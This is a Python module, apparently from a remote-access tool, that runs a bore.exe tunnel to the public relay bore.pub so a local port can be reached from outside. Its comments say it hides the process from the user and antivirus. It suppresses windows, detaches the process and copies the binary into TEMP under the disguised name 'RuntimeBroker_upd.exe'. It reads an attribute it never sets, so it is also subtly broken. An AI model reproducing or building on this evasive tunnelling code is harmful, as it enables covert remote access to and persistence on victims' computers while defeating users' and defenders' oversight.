from core.resolver import (
    Resolver, _OS, _SUBPROCESS, _THREADING, _SHUTIL, _TIME, _SOCKET, _TYPING
)
os = Resolver.get_mod(_OS)
subprocess = Resolver.get_mod(_SUBPROCESS)
threading = Resolver.get_mod(_THREADING)
shutil = Resolver.get_mod(_SHUTIL)
time = Resolver.get_mod(_TIME)
socket = Resolver.get_mod(_SOCKET)
typing_mod = Resolver.get_mod(_TYPING)
Optional = typing_mod.Optional
from core.config import ConfigManager
from core.error_logger import log_error, log_info

class BoreTunneler:
    """H-12: Network Tunneling & Connectivity Resilience"""
    
    def __init__(self, local_port: int = 8080):
        self.local_port = local_port
        # Encrypted remote server URL: "bore.pub" -> "DF0KDmAhLAA="
        self.remote_server = "bore.pub" 
        self.remote_port = 7835
        self.process: Optional[subprocess.Popen] = None
        self.running = False
        self.lock = threading.Lock()
        self.retry_count = 0
        self.max_retries = 5

    def _is_port_available(self, port: int) -> bool:
        """Checks if a local port is available for binding"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.bind(('127.0.0.1', port))
            sock.close()
            return True
        except:
            return False

    def start_tunnel(self):
        """Starts bore.exe local tunnel in a background thread with backoff"""
        bore_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "bore.exe")
        if not os.path.exists(bore_path):
            log_error(f"Bore executable not found at {bore_path}", "Tunneler")
            return False
            
        def run():
            while self.running and self.retry_count < self.max_retries:
                try:
                    # Check port availability
                    if not self._is_port_available(self.local_port):
                        log_error(f"Port {self.local_port} in use, waiting...", "Tunneler")
                        time.sleep(10)
                        continue
                        
                    # bore local <LOCAL_PORT> --to <REMOTE_SERVER>
                    cmd = [bore_path, "local", str(self.local_port), "--to", self.remote_server]
                    
                    with self.lock:
                        # CREATE_NO_WINDOW (0x08000000) | DETACHED_PROCESS (0x00000008)
                        self.process = subprocess.Popen(
                            cmd, 
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL,
                            stdin=subprocess.DEVNULL,
                            creationflags=0x08000000 | 0x00000008
                        )
                    
                    self.retry_count = 0 # Reset on success
                    log_info(f"Tunnel process started: {self.process.pid}", "Tunneler")
                    self.process.wait()
                    
                except Exception as e:
                    log_error(f"Tunnel error: {e}", "Tunneler")
                    self.retry_count += 1
                    time.sleep(2 ** self.retry_count) # Exponential backoff
                    
        self.running = True
        threading.Thread(target=run, daemon=True).start()
        
        # Verify startup
        time.sleep(1.5)
        return self.is_active()

    def start_bridge(self) -> Optional[str]:
        """
        Starts bore tunnel and parses the public URL from output.
        Returns the public bridge address (e.g. 'bore.pub:12345').
        """
        if self.running and self.public_url: return self.public_url

        bore_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tools", "bore.exe")
        if not os.path.exists(bore_path):
            log_error(f"Bore executable not found at {bore_path}", "Tunneler")
            return None

        try:
            # H-13: Hide process from user/AV and use stealthy name if possible
            # On Windows, we can use CREATE_NO_WINDOW
            startupinfo = None
            if os.name == 'nt':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0 # SW_HIDE
            
            # Logic for sneaky binary name (copy bore.exe to a temp system-like name)
            temp_dir = os.environ.get('TEMP', os.getcwd())
            stealth_path = os.path.join(temp_dir, "RuntimeBroker_upd.exe")
            
            # Only copy if it doesn't exist or if the original bore.exe is newer (simple update check)
            if not os.path.exists(stealth_path) or (os.path.exists(bore_path) and os.path.getmtime(bore_path) > os.path.getmtime(stealth_path)):
                if os.path.exists(bore_path):
                    try:
                        shutil.copy2(bore_path, stealth_path)
                        log_info(f"Copied bore.exe to stealth path: {stealth_path}", "Tunneler")
                    except Exception as e:
                        log_error(f"Failed to copy bore.exe to stealth path: {e}", "Tunneler")
                        stealth_path = bore_path # Fallback to original path
                else:
                    stealth_path = bore_path # Fallback if original not found
            
            cmd_path = stealth_path if os.path.exists(stealth_path) else bore_path
            
            # bore local <LOCAL_PORT> --to <REMOTE_SERVER>
            cmd = [cmd_path, "local", str(self.local_port), "--to", self.remote_server]
            
            # We capture stdout to find the bridge URL
            self.process = subprocess.Popen(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, # Keep stderr separate for better error logging
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if os.name == 'nt' else 0,
                startupinfo=startupinfo, # Apply startupinfo for Windows
                text=True
            )
            
            # Read first few lines to find the URL
            # Expected line: "listening at bore.pub:12345"
            for _ in range(20):
                line = self.process.stdout.readline()
                if "listening at" in line:
                    parts = line.split("listening at")
                    if len(parts) > 1:
                        addr = parts[1].strip()
                        self.running = True
                        log_info(f"P2P Bridge active: {addr}", "Tunneler")
                        return addr
                time.sleep(0.5)
                
            return None
        except Exception as e:
            log_error(f"Failed to start bridge: {e}", "Tunneler")
            return None

    def stop_tunnel(self):
        """Graceful termination of the tunnel process"""
        with self.lock:
            self.running = False
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=5)
                except:
                    try: self.process.kill()
                    except: pass
                self.process = None
            self.retry_count = 0
            log_info("Tunnel stopped", "Tunneler")

    def is_active(self) -> bool:
        """Checks if the tunnel process is currently running"""
        with self.lock:
            if not self.running or not self.process: return False
            return self.process.poll() is None
